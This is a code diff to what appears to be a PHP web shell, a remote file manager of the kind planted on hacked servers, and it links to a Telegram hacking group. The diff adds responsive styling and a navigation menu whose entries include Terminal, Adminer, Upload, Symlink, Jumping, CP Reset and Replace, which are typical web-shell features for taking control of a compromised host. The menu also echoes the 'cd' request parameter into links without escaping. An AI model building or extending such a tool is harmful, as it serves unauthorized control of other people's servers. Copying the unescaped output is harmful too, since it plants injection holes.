@@ -428,6 +428,29 @@ if (!isset($_SESSION['login'])) {
 		background-color:rgba(222,222,222,0.73);
 		text-decoration:none;
 	}
+	.navbar {
+		display: none;
+    	border: none;
+    	width: 92%;
+        position: fixed;
+        margin-top: -35px;
+        padding:20px;
+    }
+    .navbar a {
+      	z-index: 0;
+		background: var(--color-bg);
+		border: 1px solid #f2f2f2;
+		margin:10px;
+		overflow: auto;
+		font-weight: bold;
+		display: block;
+		color: #1889f5;
+		border-radius:5px;
+		padding: 10px;
+    }
+    .navbar .icon {
+        display: none;
+      }
 	@media (min-width: 320px) and (max-width: 480px) {
 		body {
 			margin:0;
@@ -435,6 +458,9 @@ if (!isset($_SESSION['login'])) {
 		}
 		* {
 			font-size: 12px;
+		}
+		.navbar {
+			display: block;
 		}
 		div.container {
 			margin: -7.5;
@@ -453,13 +479,53 @@ if (!isset($_SESSION['login'])) {
   			padding: 2px 2px;
 		}
 		div.header {
+			padding-top: 5px;
+			position: center;
 			box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
-			width:100%;
+			width:84.3%;
+			border-radius: 5px;
+			background: #fff;
 		}
 		div.center {
+			margin-top: -25px;
+			overflow: hidden;
 			background: none;
 			height:700px;
 		}
+		.navbar a {
+            display: none;
+        }
+        .navbar a.icon {
+            float: right;
+            margin-top:30px;
+            margin-right: 107px;
+            width:auto;
+            display: block;
+            position: fixed;
+            right: 0;
+            top: 0;
+        }
+        div.raw {
+        	padding:20px;
+        }
+        span.home {
+        	margin-bottom: 20px;
+        }
+        .navbar.responsive {position: relative;}
+        .navbar.responsive .icon {
+            position: fixed;
+            margin-top:30px;
+            width:auto;
+            right: 0;
+            top: 0;
+        }
+        }
+        .navbar.responsive a {
+            float: none;
+            display: block;
+            width:76%;
+            text-align: left;
+        }
 	}
 </style>
 <script type='text/javascript'>
@@ -498,9 +564,19 @@ if (!isset($_SESSION['login'])) {
 		document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
 	}
 </script>
+<script>
+function myFunction() {
+  var x = document.getElementById("myTopnav");
+  if (x.className === "navbar") {
+    x.className += " responsive";
+  } else {
+    x.className = "navbar";
+  }
+}
+</script>
 <center>
 <div class="container">
-	<div class="row">
+	<div class="row raw">
 		<div class="header">
 			<div class="filemanager">
 				<span class="home">
@@ -511,6 +587,75 @@ if (!isset($_SESSION['login'])) {
 					</a>
 				</span>
 			</div>
+		</div>
+	</div>
+	<div class="row">
+		<div class="navbar" id="myTopnav">
+			<a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
+				<i class="fa fa-home" aria-hidden="true"></i>
+				<span>Home</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>">
+				<i class="fa fa-file" aria-hidden="true"></i>
+				<span>Files</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&info">
+				<i class="fa fa-info-circle" aria-hidden="true"></i> 
+				 <span>Info</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-terminal" aria-hidden="true"></i>
+				<span>Terminal</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-cogs"></i>
+				<span>Config</span>
+			</a>
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
+				<i class="fa fa-user"></i>
+				<span>Adminer</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&upload">
+				<i class="fa fa-upload"></i>
+				<span>Upload</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-exclamation-triangle"></i>
+				<span>Jumping</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-exclamation-circle"></i>
+				<span>Symlink</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fas fa-network-wired"></i>
+				<span>Network</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&x=make">
+				<i class="fa fa-plus-square" aria-hidden="true"></i>
+				<span>Add File</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-exclamation-triangle"></i>
+				<span>Replace</span>
+			</a>
+			<a href="https://t.me/BHSec" target="_blank">
+				<i class="fa fa-users" aria-hidden="true"></i>
+				<span>Join Us</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-bug" aria-hidden="true"></i>
+				<span>CP Reset</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
+				<i class="fa fa-info"></i>
+				<span>About me</span>
+			</a>
+			<a href="?logout" class="logout">
+				<i class="fa fa-power-off" aria-hidden="true"></i>
+				<span>Logout</span>
+			</a>
+			<a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()"><i class="fa fa-list-ul" aria-hidden="true"></i></a>
 		</div>
 	</div>
 	<?php
